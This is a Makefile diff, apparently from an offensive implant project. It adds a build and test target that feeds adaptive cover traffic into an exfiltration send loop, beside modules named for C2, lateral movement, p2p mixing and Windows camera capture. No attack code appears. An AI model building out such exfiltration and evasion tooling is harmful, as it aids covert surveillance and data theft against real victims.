@@ -26,7 +26,7 @@ LATLIB  := ../08_lateral/build/proxy.o ../08_lateral/build/lateral.o
 AGOBJS  := ../agent_windows/build/linux/cam_jpeg.o \
            ../agent_windows/build/linux/cam_mock.o
 
-all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells $(BUILD)/dump_task $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_task_resume
+all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells $(BUILD)/dump_task $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_task_resume $(BUILD)/test_link_cover
 
 $(BUILD):
 	mkdir -p $(BUILD)
@@ -109,13 +109,24 @@ $(BUILD)/dump_cells: tests/dump_cells.c $(BUILD)/exfil.o $(P2PLIB) $(C2OBJS) $(L
 $(BUILD)/test_cam_e2e: tests/test_cam_e2e.c $(BUILD)/exfil.o $(P2PLIB) $(C2OBJS) $(LATLIB) $(AGOBJS)
 	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB) $(AGOBJS)
 
+# 自适应覆盖流量接入真实发送循环：提交 + 泵送（入队-出片交替）。
+# 依赖 14_p2p 的 mix/cover（libp2p.a）与 exfil 的 chan/link。
+$(BUILD)/link_cover.o: src/link_cover.c include/exfil_link_cover.h include/exfil.h | $(BUILD)
+	$(CC) $(CFLAGS) -c $< -o $@
+
+# 真实进程端到端：fork + socketpair，父发子收。验证空闲期覆盖流量在线上
+# 流动、覆盖不吃掉数据、大载荷分批入队发完、换信道覆盖自动缩放。
+$(BUILD)/test_link_cover: tests/test_link_cover.c $(BUILD)/link_cover.o $(BUILD)/exfil.o $(BUILD)/exfil_link.o $(P2PLIB) $(C2OBJS) $(LATLIB)
+	$(CC) $(CFLAGS) $< $(BUILD)/link_cover.o $(BUILD)/exfil.o $(BUILD)/exfil_link.o -o $@ \
+	  $(P2PLIB) $(C2OBJS) $(LATLIB)
+
 # 跨语言对齐工具：C 侧真编码任务/回执 -> 文件，供 Python 侧解码比对；
 # 反向模式 chk 则读取 Python 生成的 wire 并解码，实现双向验证。
 $(BUILD)/dump_task: tests/dump_task.c $(BUILD)/task.o $(BUILD)/sched.o $(P2PLIB) $(C2OBJS) $(LATLIB)
 	$(CC) $(CFLAGS) $< $(BUILD)/task.o $(BUILD)/sched.o -o $@ \
 	  $(P2PLIB) $(C2OBJS) $(LATLIB)
 
-test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit
+test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover
 	./$(BUILD)/test_exfil
 	./$(BUILD)/test_cam_e2e
 	./$(BUILD)/test_exfil_circuit
@@ -123,6 +134,7 @@ test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BU
 	./$(BUILD)/test_sched_gate
 	./$(BUILD)/test_task
 	./$(BUILD)/test_task_circuit
+	./$(BUILD)/test_link_cover
 
 inspect: all
 	@echo "== 21_exfil 公开符号 =="
